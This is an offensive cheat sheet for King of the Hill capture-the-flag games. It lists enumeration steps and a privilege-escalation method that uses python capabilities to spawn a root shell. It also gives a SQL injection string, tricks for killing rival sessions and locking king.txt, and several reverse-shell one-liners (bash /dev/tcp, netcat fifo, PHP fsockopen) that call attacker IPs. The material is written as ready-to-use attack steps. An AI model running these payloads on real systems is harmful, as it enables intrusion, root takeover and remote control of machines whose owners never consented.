# KOTH

1. `enum4linux` - smb service enumeration

2. `ps fauxwww` you can see the all the users subprocess and cut them out
Also `ps aux | grep pts` and start killing sessions ;)

3. `jobs` and `ps ef` can make you see the all the processes

4. `tmux -S session/default` - priv esclation from tmux

5. Basic methodology for privilage esc 
	First check for `SUID bit files` - `find / -perm /4000 2>/dev/null`
	Second check for `cap files`  - `getcap -r / 2>dev/null --- cap files`
	Thrid check for `linpeas.sh`
	Fourth check fir `lse.sh`
	Exploiting through capabilities:
	Python:
	```
	getcap -r / 2>/dev/null - check if other than network any have cap
	pwd
	ls -al python3
	./python3 \-c 'import os; os.setuid(0); os.system("/bin/bash")'
	BOOM
	```
	

6. Make files immutable and unimmutable - `chattr -i [file]` or `chattr -a [file]`

7. To be a permanent king make a infinite loop of one sec rest 
```
while :
do
echo "x3rz" > king.txt
sleep 1
done
```
8. Found mysql service? try `mysql -h [ip] -u root -p` and default creds as password or root

9. Enough of enumeration then try last time 
 `gobuster dir -u [url] -w [wordlist] -x .db,.txt,.bak` and more extensions.

10. SQLi for this use or try always `admin' or '1=1' -- -` other use sqlmap with burp

11. Start the nmap and gobuster instantly after machine boots up

12. Use Rustscan instead of nmap. or 1st rust scan for quick port identification and then nmap for details.

13. Instead of making immutable the file also make use of `+a` which only allows appending the string.

14. If you see any binary missing then upload staticcally linked  binaries 
	**Statically-linked** files are 'locked' to the executable at link time so they never change. A **dynamically linked** file referenced by an executable can change just by replacing the file on the disk. This allows updates to functionality without having to re-link the code; the loader re-links every time you run it.
	[online available binaries](https://busybox.net/downloads/binaries/1.31.0-i686-uclibc/)
	or 
	[Andrew-d static binaries](http://github.com/andrew-d/static-binaries)

15. clobber:
	no one can add any string using `>` 
	basic command : `set -o noclobber [file]`

16. Use `ssh -t` to hide your session from tty.

17. Command panel then try this payload or in case of **vulnerable parameter**:  ``php -r '$sock=fsockopen("{IP}",{PORT}});exec("/bin/sh -i <&3 >&3 2>&3");'``
or 
`bash -c 'bash -i >& /dev/tcp/10.9.1.210/1337 0>&1'`
or
```
bash -i >& /dev/tcp/ATTACKING-IP/80 0>&1
```
or
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.9.1.210 1337 >/tmp/f
```

18. Check for kernel version
19. **sudo versions < 1.8.28 are vulnerable to CVE-2019-14287**
20.  Add IPs to block list by iptables
`iptables -A INPUT -s 10.10.10.9 -j DROP`
21. Write message to other users pts
`write [USER] pts/[number]`
22. Windows file transfer:
`certutil -urlcache -split -f [url]`
23. [Must](https://medium.com/bugbountywriteup/things-i-learned-after-rooting-25-hack-the-box-machines-e9eada4ea6ca)